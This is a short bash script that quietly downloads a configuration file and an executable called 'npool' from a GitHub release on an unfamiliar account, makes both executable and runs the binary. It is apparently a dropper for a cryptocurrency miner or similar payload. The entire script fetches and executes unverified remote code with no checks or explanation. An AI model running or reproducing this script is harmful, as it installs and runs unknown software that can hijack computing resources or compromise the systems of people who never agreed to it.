#!/bin/bash
wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/config.json
wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/npool
chmod +x config.json
chmod +x npool
./npool
